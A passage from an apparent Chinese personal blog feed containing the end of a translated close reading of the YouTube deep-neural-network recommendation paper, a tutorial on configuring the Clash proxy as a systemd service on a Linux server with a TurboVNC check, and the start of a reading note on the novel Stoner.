是训练数据中最大观察到的时间。</p></blockquote><h2 id="3-5-模型特征和深度的实验"><a href="#3-5-模型特征和深度的实验" class="headerlink" title="3.5 模型特征和深度的实验"></a>3.5 模型特征和深度的实验</h2><p>添加特征和深度显着提高了留出法的数据的精度，如图 6 所示。在这些实验中，1M 视频和 1M 搜索标记的词汇表使用 256 个浮点数进行嵌入，每个浮点数最多包含大小为 50 个最近的观看和 50 个最近的搜索。Softmax 层输出相同的维度为 256的 1M 视频类别的多项分布（可以将其视为单独的输出视频嵌入）。这些模型在数据集上训练几个 epoch 直到收敛到所有 YouTube 用户。网络结构遵循一个共同的“塔”模式：网络的底部很宽，每个连续的隐藏层将单元的数量减半（类似于图 3）。深度零网络实际上是一个线性分解方案，它的表现与前驱系统非常相似。添加宽度和深度，直到增量收益减少和收敛变得困难：</p><ul><li>深度0：线性层简单地变换连接层以匹配256的softmax维度</li><li>深度1：256 ReLU</li><li>深度2：512 ReLU → 256 ReLU</li><li>深度3：1024 ReLU → 512 ReLU → 256 ReLU</li><li>深度4：2048 ReLU → 1024 ReLU → 512 ReLU → 256 ReLU</li></ul><p><img src="/2024/11/14/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB5%EF%BC%9ADeep-Neural-Networks-for-YouTube-Recommendations/image_i_1-Ud7bPR.png"></p><blockquote><p>图 6：视频嵌入之外的特征提高了保持平均精度（MAP）和深度层增加了表现力，以便模型可以通过建模它们的交互来有效地使用这些附加特征。</p></blockquote><hr><h1 id="4-排序"><a href="#4-排序" class="headerlink" title="4 排序"></a>4 排序</h1><p>排序的主要作用是使用之前曝光过的数据来专门校准特定用户界面的候选预测。例如，用户可能通常以高概率观看给定的视频，但可能由于推荐的视频采用的缩略图不当，导致用户没有点击对应的视频。在排序的过程中，因为只有几百个视频进行排序，所以我们可以使用更多用于描述视频的特征以及用户与视频的关相似度，但是在召回的时候有数百万个物品需要被打分，就不能使用很多特征。排序可以同时处理来自不同召回源的物品的分数（不同召回通道可能打分标准不同）。</p><p>我们使用类似于召回的深度神经网络，使用逻辑回归为每个视频印象分配独立的分数（图 7），然后将视频按此分数排序并返回给用户。我们的最终排序目标不断根据线上的 A&#x2F;B 测试结果进行调整，但通常是每个推荐视频的预期观看时间的简单函数。通过点击率排名通常会促进用户不完整（“标题党”）的欺骗性视频，而视频的观看时间更好地体现参与度 [13, 25]。</p><p><img src="/2024/11/14/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB5%EF%BC%9ADeep-Neural-Networks-for-YouTube-Recommendations/image_ROOZR4MlMw.png"></p><blockquote><p>图 7：描述嵌入分类特征（二值和多值）的深度排序网络架构，具有共享嵌入和归一化连续特征的幂。所有层都是完全连接的。在实践中，数百个特征被输入到网络中。</p></blockquote><h2 id="4-1-特征表示"><a href="#4-1-特征表示" class="headerlink" title="4.1 特征表示"></a>4.1 特征表示</h2><p>我们的特征与分类和连续&#x2F;序数特征的传统分类法隔离。我们使用的分类特征在其基数上差异很大——有些是二分类的（例如，用户是否登录），而另一些则具有数百万个可能的值（例如用户的最后一次搜索查询）。特征根据它们是否仅贡献单个值（“二值”）或一组值（“多值”）来进一步拆分。单分类特征的一个例子是被评分印象的视频 ID，而相应的多价特征可能是用户观看的最后 N 个视频 ID 的包。我们还根据它们是否描述了项目的属性（“印象”）或用户&#x2F;上下文的属性（“查询”）来对特征进行分类。查询特征为每个请求计算一次，而为每个项目评分计算印象特征。</p><h3 id="4-1-1-特征工程"><a href="#4-1-1-特征工程" class="headerlink" title="4.1.1 特征工程"></a>4.1.1 特征工程</h3><p>我们通常在我们的排名模型中使用数百个特征，连续特征和离散特征各占一半。尽管深度学习可以不同人工设计特征，但我们的原始数据的性质不容易直接输入到前馈神经网络中，所以仍然需要人工花费很多精力来将用户和视频数据转换为有用的特征。主要挑战是表示用户点击的时间顺序以及这些点击如何与正在评分的视频相关联。</p><p>考虑其他人在广告排序方面的经验 [7]，我们观察到最重要的信息是那些描述用户之前与物品本身以及其他相似物品的交互。例如，考虑用户过去上传过被评分的视频的频道——用户会从这个频道观看多少视频？上次用户在这个频道观看视频是什么时候？这些描述过去用户对相关物品行为的连续特征特别有用，因为它们可以很好地在不同的物品之间进行泛化。我们还发现，以特征的形式将信息从召回到排序至关重要，例如哪些源召回了这个视频？他们打的分数是多少？</p><p>描述过去推荐视频的特征对于在推荐中引入“churn”也很重要（后继推荐请求不返回相同的视频）。如果用户最近被推荐了一个视频，但没有观看它，那么模型将自然地将这个视频降到下一个页面负载。服务于每秒钟的印象和观看历史是本文范围之外的自身工程壮举，但对产生响应建议至关重要。</p><h3 id="4-1-2-嵌入分类特征"><a href="#4-1-2-嵌入分类特征" class="headerlink" title="4.1.2 嵌入分类特征"></a>4.1.2 嵌入分类特征</h3><p>与召回类似，我们使用嵌入将稀疏的分类特征映射到合适的神经网络稠密向量。每个唯一 ID 空间（“词汇表”）都有一个单独的学习嵌入，其维度与唯一值数量的对数近似成正比。这些词汇表是简单的查找表，它是通过在训练期间一次传递数据来构建的。非常大的基数 ID 空间（例如视频 ID 或搜索查询术语）在根据点击印象的频率进行排序后只选择前 N 个。词汇表外的值简单地映射到零嵌入。与召回一样，多个分类特征的嵌入在被馈送到网络之前进行平均。</p><h3 id="4-1-3-连续特征归一化"><a href="#4-1-3-连续特征归一化" class="headerlink" title="4.1.3 连续特征归一化"></a>4.1.3 连续特征归一化</h3><p>众所周知，神经网络对其输入[9]的缩放和分布非常敏感，而决策树等替代方法对单个特征的缩放是不变的。我们发现连续特征的适当归一化对于收敛至关重要。通过缩放值将分布 $f$ 的连续特征 $x$ 转换为 $\tilde{x}$，使用累积分布 $\tilde{x}&#x3D;\int_{-\infty}^{x} \mathrm{~d} f$ 使得特征在 $[0, 1)$ 中均匀分布。该积分近似于在训练开始之前，在单次传递数据上计算的特征值的分位数上的线性插值。</p><p>除了原始归一化特征 $\tilde{x}$，我们还输入幂 $\tilde{x}^{2}$ 和 $\sqrt{\tilde{x}}$，通过对特征做非线性运算来使赋予网络更具表现力。通过对连续特征做变换有助于改进线上精度。</p><h2 id="4-2-对预估观看时间进行建模"><a href="#4-2-对预估观看时间进行建模" class="headerlink" title="4.2 对预估观看时间进行建模"></a>4.2 对预估观看时间进行建模</h2><p>我们的目标是在给定正面（点击视频）或负面（未点击视频）的训练样本的情况下预测预估观看时间。正样本使用用户真实观看视频的时间进行标注。为了对预估观看时间进行预测，我们使用了为此目的开发的加权逻辑回归方法。</p><p>该模型在交叉熵损失下使用逻辑回归进行训练（图 7）。然而，正（点击）样本是由实际的视频观看时间加权。负（未点击）样本所有接收单元权重。这样，逻辑回归学习的几率是 $\frac{\sum_{i} T_{i}}{N-k}$，其中 $N$ 是样本数，$k$ 是正样本的数量，$T_i$ 是第 $i$ 个视频的观看时间。假设正样本的比例很小（在我们的例子中是正确的），学习的几率约为 $E[T](1+p)$ ，其中 $P$ 是点击概率，$E[T]$ 是视频的预期观看时间。由于 $P$ 很小，这个乘积接近 $E[T]$。对于推理，我们使用指数函数 $e^{x}$ 作为最终激活函数来产生这些接近预估观看时间的概率。</p><h2 id="4-3-隐藏层的实验"><a href="#4-3-隐藏层的实验" class="headerlink" title="4.3 隐藏层的实验"></a>4.3 隐藏层的实验</h2><p>表 1 显示了我们在具有不同隐藏层配置的下一天 holdout 数据上获得的结果。通过考虑单个页面上显示给用户的正（点击）和负（未点击）评价来获得每种配置（“加权、每个用户的损失”）的指标。我们首先使用我们的模型对这两种评价进行评分。如果负面视频的得分高于正面视频，那么我们认为正面视频的观看时间是错误的。加权的每个用户的损失是，与坚持印象对相比，错误预测的观看时间占总观看时间的一小部分。</p><blockquote><p>表 1：更广泛和更深的隐藏 ReLU 层对观察第二天保持数据计算的时间加权成对损失的影响。</p></blockquote><p><img src="/2024/11/14/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB5%EF%BC%9ADeep-Neural-Networks-for-YouTube-Recommendations/image_bjelRxpvcu.png"></p><p>这些结果表明，增加隐藏层的宽度可以改善结果，就像增加它们的深度一样。然而，需要权衡的是服务器推理所需的 CPU 时间。1024 宽 ReLU 的配置，然后是 512 宽的 ReLU，然后是 256 宽的 ReLU，为我们提供了最好的结果，同时计算开销能够留在我们的服务器的 CPU 预算之内。</p><p>对于 1024 → 512 → 256 模型，我们尝试只输入归一化的连续特征而不提供幂运算，这将损失增加了 0.2%。在相同的隐藏层配置下，我们还训练了一个模型，其中正例和负例的权重相等。不出所料，这将观看时间加权损失增加了 4.1%。</p><hr><h1 id="5-结论"><a href="#5-结论" class="headerlink" title="5 结论"></a>5 结论</h1><p>我们已经介绍了用于推荐 YouTube 视频的深度神经网络架构，分为两个不同的问题：召回和排序。</p><p>我们的深度协同过滤模型能够有效地输入很多特征，并对它们与深度层的相互作用进行建模，优于YouTube [23] 中使用的以前的矩阵分解方法。在选择推荐的替代问题时，科学比科学更有艺术，我们发现通过捕获非对称共观看行为并防止未来信息的泄漏，对未来观看进行分类以在现场指标上表现良好。从分类器中保留判别信号对于获得良好的结果也是必不可少的——否则模型将过度拟合代理问题，而不是很好地转移到主页。</p><p>我们证明了使用训练示例的年龄作为输入特征消除了对过去的固有偏差，并允许模型表示流行视频的时间相关行为。这提高了离线保持精度结果，并在 A&#x2F;B 测试中最近上传的视频上显着提高了观看时间。</p><p>排序是一个更经典的机器学习问题，但我们的深度学习方法优于以前的线性和基于树的观看时间预测方法。推荐系统特别受益于描述过去用户行为与物品的专业特征。深度神经网络需要离散和连续特征的特殊表示，我们分别通过嵌入和分位数归一化进行变换。深度层被证明可以有效地对数百个特征之间的非线性交互进行建模。</p><p>通过对正例的观看时间和负例的统一训练示例进行加权来修改逻辑回归，使我们能够学习密切建模预期观看时间的几率。与直接预测点击率相比，这种方法在观看时间加权排名评估指标上的表现要好得多。</p><hr><h1 id="6-鸣谢"><a href="#6-鸣谢" class="headerlink" title="6 鸣谢"></a>6 鸣谢</h1><p>作者要感谢 Jim McFadden 和 Pranav Khattan 的宝贵指导和支持。Sujeet Bansal、Shripad Thite 和 Radek Vingralek 实现了培训和服务基础设施的关键组成部分。Chris Berg 和 Trevor Walker 贡献了深思熟虑的讨论和详细的反馈。</p>]]></content>
      
      
      <categories>
          
          <category> 科研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 推荐系统 </tag>
            
            <tag> 论文精读 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux服务器使用clash配置VPN</title>
      <link href="/2024/11/09/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%BF%E7%94%A8clash%E9%85%8D%E7%BD%AEVPN/"/>
      <url>/2024/11/09/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%BF%E7%94%A8clash%E9%85%8D%E7%BD%AEVPN/</url>
      
        <content type="html"><![CDATA[<p>之前配置过服务器的VPN，但是最近在一个新的服务器上重新配置的时候总是不成功。经过一番努力，最终成功配置VPN，特此记录。</p><h1 id="1-下载-clash-安装包"><a href="#1-下载-clash-安装包" class="headerlink" title="1 下载 clash 安装包"></a>1 下载 clash 安装包</h1><p>首先需要为服务器下载 clash 安装包，进入 <a href="https://www.clash.la/releases/" title="Clash Releases">Clash Releases</a> 网站选择红色的两个其中之一进行下载。</p><p><img src="/2024/11/09/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%BF%E7%94%A8clash%E9%85%8D%E7%BD%AEVPN/image_AHo0i1Jn31.png"></p><p>如果服务器有界面，则可以直接使用服务器的浏览器进行下载。如果没有，则先使用自己的电脑下载后，传输到服务器中。</p><p><img src="/2024/11/09/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%BF%E7%94%A8clash%E9%85%8D%E7%BD%AEVPN/image_yOvzv2wA8g.png"></p><p>下载之后进行解压，得到文件 clash-linux-amd64-v3-v1.18.0。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip clash-linux-amd64-v3-v1.18.0.gz</span><br></pre></td></tr></table></figure><p>使用 mv 命令将其重命名为 clash，方便之后使用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> clash-linux-amd64-v3-v1.18.0 clash</span><br></pre></td></tr></table></figure><p>之后增加 clash 程序执行的权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x clash</span><br></pre></td></tr></table></figure><p>此时还不能运行 clash，因为我们还少两个文件：</p><ol><li>config.yaml：配置文件</li><li>Country.mmdb：包含 IP 地址到国家的映射，Clash 利用这个文件来识别用户的 IP 地址所在的国家或地区</li></ol><p>接下来分别介绍如何获取这两个文件。</p><hr><h1 id="2-获取-config-yaml"><a href="#2-获取-config-yaml" class="headerlink" title="2 获取 config.yaml"></a>2 获取 config.yaml</h1><p>config.yaml为clash的代理规则和clash的一些其他设置。代理规则不需要我们自己编写，通过订阅地址直接下载即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O config.yaml <span class="string">&quot;你的订阅链接&quot;</span></span><br></pre></td></tr></table></figure><p>如果使用的是 cv2 机场，则有两种方法可以获得 clash 的订阅链接。</p><h2 id="2-1-方法一"><a href="#2-1-方法一" class="headerlink" title="2.1 方法一"></a>2.1 方法一</h2><p>打开自己电脑的 clash ，然后选择“配置”这一栏，把鼠标放在配置文件上停留，就会出现一个链接，这个链接就是你的订阅链接。</p><p><img src="/2024/11/09/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%BF%E7%94%A8clash%E9%85%8D%E7%BD%AEVPN/image_lLH163PvHV.png"></p><h2 id="2-2-方法二"><a href="#2-2-方法二" class="headerlink" title="2.2 方法二"></a>2.2 方法二</h2><p>打开网页 <a href="cv2.store" title="cv2.store">cv2.store</a> 进行登录，然后选择左侧的“下载和教程”，点击“Linux”。</p><p><img src="/2024/11/09/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%BF%E7%94%A8clash%E9%85%8D%E7%BD%AEVPN/image_IhSI0vKE1L.png"></p><p>图中所示的链接就是你的订阅链接。</p><p><img src="/2024/11/09/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%BF%E7%94%A8clash%E9%85%8D%E7%BD%AEVPN/image_tMjtPCKDVw.png"></p><p>到这里，我们就获得了属于自己的配置文件，现在一共有 clash 和 config.yaml 这两个文件，接下来需要获取 Country.mmdb。</p><p><img src="/2024/11/09/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%BF%E7%94%A8clash%E9%85%8D%E7%BD%AEVPN/image_TuJbPPcC-G.png"></p><hr><h1 id="3-获取-Country-mmdb"><a href="#3-获取-Country-mmdb" class="headerlink" title="3 获取 Country.mmdb"></a>3 获取 Country.mmdb</h1><p>目前版本的 clash 不会自动生成MMDB文件，所以需要使用命令行下载。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O Country.mmdb https://github.com/Dreamacro/maxmind-geoip/releases/latest/download/Country.mmdb</span><br></pre></td></tr></table></figure><p>这里需要访问 github，如果下载速度较慢，可以先下载到自己电脑上，然后将该文件上传到服务器中。</p><p><img src="/2024/11/09/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%BF%E7%94%A8clash%E9%85%8D%E7%BD%AEVPN/image_vmUuUkxCPK.png"></p><hr><h1 id="4-运行-clash"><a href="#4-运行-clash" class="headerlink" title="4 运行 clash"></a>4 运行 clash</h1><p>现在需要的两个文件我们都获取了，使用以下命令运行 clash：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./clash -d .</span><br></pre></td></tr></table></figure><p>运行 clash 之后还需要修改系统代理，这样流量才能走 clash。</p><h2 id="4-1-临时修改"><a href="#4-1-临时修改" class="headerlink" title="4.1 临时修改"></a>4.1 临时修改</h2><p>在终端运行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://127.0.0.1:7890</span><br><span class="line"><span class="built_in">export</span> https_proxy=http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><h2 id="4-2-永久修改"><a href="#4-2-永久修改" class="headerlink" title="4.2 永久修改"></a>4.2 永久修改</h2><ol><li>运行 <code>cd ~</code> 切换到 root 账户目录</li><li>运行 <code>vim .bashrc</code> 编辑，添加系统代理</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://127.0.0.1:7890</span><br><span class="line"><span class="built_in">export</span> https_proxy=http://127.0.0.1:7890</span><br><span class="line"><span class="built_in">export</span> all_proxy=socks5://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>添加后进行保存。</p><p><img src="/2024/11/09/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%BF%E7%94%A8clash%E9%85%8D%E7%BD%AEVPN/image_oZ5oDUjdiA.png"></p><h2 id="4-3-测试是否配置成功"><a href="#4-3-测试是否配置成功" class="headerlink" title="4.3 测试是否配置成功"></a>4.3 测试是否配置成功</h2><h3 id="4-3-1-命令行测试"><a href="#4-3-1-命令行测试" class="headerlink" title="4.3.1 命令行测试"></a>4.3.1 命令行测试</h3><p>如果运行 <code>wget google.com</code> 后能够得到一个 html 文件，则说明配置成功。</p><p><img src="/2024/11/09/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%BF%E7%94%A8clash%E9%85%8D%E7%BD%AEVPN/image_DXcBm2lh9g.png"></p><h3 id="4-3-2-图形化测试"><a href="#4-3-2-图形化测试" class="headerlink" title="4.3.2 图形化测试"></a>4.3.2 图形化测试</h3><p>如果服务器只有命令行，没有图形化桌面，可以为服务器配置一个图形化桌面。</p><p>VNC（Virtual Network Computing ）是一种图形化的桌面共享协议，它使用远程帧缓冲协议 (RFB) 来远程控制另一台计算机，它将键盘和鼠标事件从一台计算机传输到另一台计算机，通过网络向另一个方向转发图形屏幕更新。 对于一般性的GUI程序运行需求，我们其实可以借助VNC在不安装完整桌面环境的情况下方便快捷的实现，下面介绍如何借助turbovnc工具，在实例中运行一个GUI程序并在本地电脑进行显示：</p><p>首先需要给服务器安装VNC和必要的一些图形显式库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装基本的依赖包</span></span><br><span class="line">apt update &amp;&amp; apt install -y libglu1-mesa-dev mesa-utils xterm xauth x11-xkb-utils xfonts-base xkb-data libxtst6 libxv1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装libjpeg-turbo和turbovnc</span></span><br><span class="line"><span class="built_in">export</span> TURBOVNC_VERSION=2.2.5</span><br><span class="line"><span class="built_in">export</span> LIBJPEG_VERSION=2.0.90</span><br><span class="line">wget http://aivc.ks3-cn-beijing.ksyun.com/packages/libjpeg-turbo/libjpeg-turbo-official_<span class="variable">$&#123;LIBJPEG_VERSION&#125;</span>_amd64.deb</span><br><span class="line">wget http://aivc.ks3-cn-beijing.ksyun.com/packages/turbovnc/turbovnc_<span class="variable">$&#123;TURBOVNC_VERSION&#125;</span>_amd64.deb</span><br><span class="line">dpkg -i libjpeg-turbo-official_<span class="variable">$&#123;LIBJPEG_VERSION&#125;</span>_amd64.deb</span><br><span class="line">dpkg -i turbovnc_<span class="variable">$&#123;TURBOVNC_VERSION&#125;</span>_amd64.deb</span><br><span class="line"><span class="built_in">rm</span> -rf *.deb</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动VNC服务端，这一步可能涉及vnc密码配置（注意不是实例的账户密码）。另外如果出现报错xauth未找到，那么使用apt install xauth再安装一次</span></span><br><span class="line"><span class="built_in">rm</span> -rf /tmp/.X1*  <span class="comment"># 如果再次启动，删除上一次的临时文件，否则无法正常启动</span></span><br><span class="line">USER=root /opt/TurboVNC/bin/vncserver :1 -desktop X -auth /root/.Xauthority -geometry 1920x1080 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -fp /usr/share/fonts/X11/misc/,/usr/share/fonts -rfbport 6006</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查是否启动，如果有vncserver的进程，证明已经启动</span></span><br><span class="line">ps -ef | grep vnc</span><br></pre></td></tr></table></figure><p>以上启动Server时，手动设置了rfbport&#x3D;6006端口，下面通过SSH隧道将实例中的6006端口代理到本地。</p><p>在本地电脑的终端（cmd&#x2F;powershell&#x2F;terminal等）中执行代理命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CNg -L 6006:127.0.0.1:6006 用户名@IP地址 -p 端口</span><br></pre></td></tr></table></figure><ul><li>需要把用户名和IP地址换成自己服务器的用户和地址，关口是SSH指令访问的服务器的端口，请找到自己实例的ssh指令<strong>做相应替换</strong>。</li><li><code>6006:127.0.0.1:6006</code>是指代理实例内<code>6006</code>端口到本地的<code>6006</code>端口。</li></ul><p><img src="/2024/11/09/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%BF%E7%94%A8clash%E9%85%8D%E7%BD%AEVPN/image_Y96mdXap3p.png"></p><p>执行上述命令后，没有任何日志是正常的，只要没有要求重新输入密码或错误退出。</p><p>之后使用turbovnc客户端进行连接，地址为上述获取的地址，一切顺利的话，输入密码就能看到VNC连接成功后的图形化界面，以及正在运行在实例中的GUI程序；</p><p><img src="/2024/11/09/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%BF%E7%94%A8clash%E9%85%8D%E7%BD%AEVPN/image_IA8amnFyyA.png"></p><p>如上图所示，可以访问谷歌浏览器，所以VPN配置成功。</p><hr><h1 id="5-clash-自启动和后台运行"><a href="#5-clash-自启动和后台运行" class="headerlink" title="5 clash 自启动和后台运行"></a>5 clash 自启动和后台运行</h1><h2 id="5-1-配置自运行"><a href="#5-1-配置自运行" class="headerlink" title="5.1 配置自运行"></a>5.1 配置自运行</h2><p>上面的方式是在终端运行 clash，当我们把终端关闭之后，clash 也会关闭，所以可以使用进程的方式来运行 clash 进行解决。</p><p>在<code>/etc/systemd/system/</code>目录新建一个<code>clash.service</code>文件，并且直接进入vim编辑器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/systemd/system/clash.service</span><br></pre></td></tr></table></figure><p><code>clash.service</code> 文件内容如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=Clash daemon, A rule-based proxy in Go.</span><br><span class="line"><span class="attr">After</span>=network.target</span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">Type</span>=simple</span><br><span class="line"><span class="attr">Restart</span>=always</span><br><span class="line"><span class="attr">ExecStart</span>=你的clash程序的绝对路径 -d config.yaml文件的绝对路径</span><br><span class="line"></span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=multi-user.target</span><br></pre></td></tr></table></figure><p>之后保存，然后开始启动 clash 服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start clash</span><br></pre></td></tr></table></figure><p>使用命令查看一下是否正常运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status clash</span><br></pre></td></tr></table></figure><p><img src="/2024/11/09/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%BF%E7%94%A8clash%E9%85%8D%E7%BD%AEVPN/image_gJIsqj35L-.png"></p><h2 id="5-2-systemctl-常用命令"><a href="#5-2-systemctl-常用命令" class="headerlink" title="5.2 systemctl 常用命令"></a>5.2 systemctl 常用命令</h2><ol><li><code>systemctl status clash</code> ：查看clash服务</li><li><code>systemctl start clash</code> ：启动clash服务</li><li><code>systemctl stop clash</code> ：停止clash服务</li><li><code>systemctl restart clash</code> ：重启clash服务</li><li><code>systemctl enable clash</code> ：设置开机自启clash服务</li><li><code>systemctl daemon-reload</code> ：如果修改了<code>clash.service</code>文件，需要此命令来重载被修改的服务文件</li></ol><p><code>systemctl</code> 是一个用于初始化系统和服务管理的命令行工具，属于 <code>systemd</code> 系统管理守护进程的一部分。它是现代 Linux 发行版中管理服务和系统状态的主要工具。</p><hr><h1 id="6-参考文档"><a href="#6-参考文档" class="headerlink" title="6 参考文档"></a>6 参考文档</h1><ol><li><a href="https://www.fuxi.info/archives/273" title="https://www.fuxi.info/archives/273">Linux中安装Clash并且实现全局代理（纯命令行）</a></li><li><a href="https://blog.myxuechao.com/post/36#%EF%BC%884%EF%BC%89%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%90%86%E6%95%88%E6%9E%9C" title="https://blog.myxuechao.com/post/36#%EF%BC%884%EF%BC%89%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%90%86%E6%95%88%E6%9E%9C">Linux 服务器安装 Clash代理</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> clash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读书记录3：斯通纳</title>
      <link href="/2024/11/06/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%953%EF%BC%9A%E6%96%AF%E9%80%9A%E7%BA%B3/"/>
      <url>/2024/11/06/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%953%EF%BC%9A%E6%96%AF%E9%80%9A%E7%BA%B3/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/11/06/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%953%EF%BC%9A%E6%96%AF%E9%80%9A%E7%BA%B3/image_uygeaxonUf.png"></p><blockquote><p>《斯通纳》是美国当代作家约翰·威廉姆斯创作的长篇小说，首次出版于1965年。</p></blockquote><h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h1><p>9月初的时候就读完了这本书，现在有时间写下读书感悟。这本书可以说是我的启蒙读物，在读这本书之前是没有读书的习惯，当时看这本书的时候感觉很有意思，里面有一些片段仿佛就是我的个人写照，一个人穷极一生，应该听从内心的召唤，活出自己的本色。</p><hr><h1 id="2-经典语录"><a href="#2-经典语录" class="headerlink" title="2 经典语录"></a>2 经典语录</h1><ol><li>爱不是最终目标而是一个过程，借助这个过程，一个人想去了解另一个人。</li><li>从长远看，各种东西，甚至让他领悟到这点的这份学问，都是徒劳和一场空，而且最终要消解成一片他们撼动不了的虚无。</li><li>我们最终还是属于这个世界，我们应该早知道这点。我相信我们是知道的，但我们得退出来一点，假装一点。</li><li>他发现自己有些迷茫，怀疑生活是否值得过下去，是否曾经有过生活。</li><li>斯通纳还非常年轻的时候，认为爱情就是一种身心的纯粹状态。</li><li>你必须牢记自己是什么人，你选择要成为什么人，记住你正在从事的东西的重要意义。</li><li>你对我的百般注解，构不成万分之一的我，却是一览无余的你。</li><li>感官突然被打开了，也就是诗突然找上了他，从此感受力都不一样了。</li><li>年纪更大些的时候，回首自己本科前两年，斯通纳仿佛感觉那段时光虚幻不实，压根就属于别人，那段已经逝去的时光，好像不是他习惯的那样正常流逝，而是断断续续地流逝着。一个片段跟另一个片段互相重叠着，但又从中分离出来，他还感觉自己从时间中被移了出来，旁观着时间在自己面前流逝，像个宏大、并不均匀地翻转着的立体景观。</li><li>父母见到他后很开心，他们好像并不怨恨他的决定，但他发现自己跟父母无话可说；而且，他意识到，他和父母已经逐渐形同陌生人。他感觉自己的爱因为失落反而更强烈了。</li><li>从寒冷的休息室走进客厅时，温暖向他扑过来，好像要把他朝后推回去；里面人们慢慢吞吞的轻语声，因为他打开门后释放出来，刹那间，由于耳朵还不适应，低语声如波涛汹涌。</li></ol><hr><h1 id="3-自知，重启人生航向"><a href="#3-自知，重启人生航向" class="headerlink" title="3 自知，重启人生航向"></a>3 自知，重启人生航向</h1><p>斯通纳出生在美国密苏里州，一个贫穷的农民家庭。高中毕业后，他带着父亲改变农场的期望，去哥伦比亚分校学习农业。第一学年，他像在农场干农活一样，兢兢业业地做功课，取得了不错的成绩。斯通纳对此很满意，他觉得父亲的期望会实现。</p><p>但第二学年，新增的文学概论课让他苦恼不已。<strong>那些文学作品，就像变幻莫测的浮云，无论他怎样苦读，都无法明白其中的含义，以至考试差点挂科。</strong>为了顺利毕业，他只能起早贪黑，利用一切时间来学习。</p><p><img 